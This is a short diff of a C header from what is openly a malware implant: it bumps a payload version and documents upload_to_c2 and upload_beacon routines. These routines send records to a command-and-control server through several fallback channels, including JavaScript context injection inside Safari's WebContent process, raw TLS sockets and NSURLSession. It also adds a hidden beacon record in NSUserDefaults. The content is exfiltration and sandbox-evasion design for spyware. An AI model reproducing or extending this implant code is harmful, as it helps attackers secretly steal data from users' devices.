@@ -13,7 +13,7 @@
  * behaviour so the operator can confirm which version is running on-device.
  * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
  */
-#define PAYLOAD_VERSION "1.11"
+#define PAYLOAD_VERSION "1.13"
 
 /*
  * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
@@ -23,7 +23,7 @@
  *   b64data     : base64-encoded payload bytes
  *
  * Upload channel priority (each falls back to the next on failure):
- *   C — JSContext injection: +currentContext or JSGlobalContextGetCurrent VM TLS; same-origin sync XHR POST to C2_UPLOAD
+ *   C — JSContext injection: VM TLS + multi-URL sync XHR (origin / relative / absolute)
  *   B — raw POSIX socket + SecureTransport TLS
  *   A — NSURLSession (blocked in WebContent, used outside WebContent)
  *   D2 — window.__d1_q push via JSContext (upload_beacon only); Stage3 reads
@@ -48,6 +48,9 @@ void upload_to_c2(const char *category, const char *path,
  *   cat=system path=/coruna/beacon desc has no tag   → Channel B or A
  *   Stage3 logs "[D2] relay cnt=1"                   → Channel D2 relay
  *   No beacon at all                                 → all channels failed
+ * Last Channel-C attempt is also written to NSUserDefaults key __cru_c2beacon
+ * (WebContent process; useful when Mac Console is unavailable — inspect plist if you
+ * can read the Safari WebContent container).
  */
 void upload_beacon(void);
 
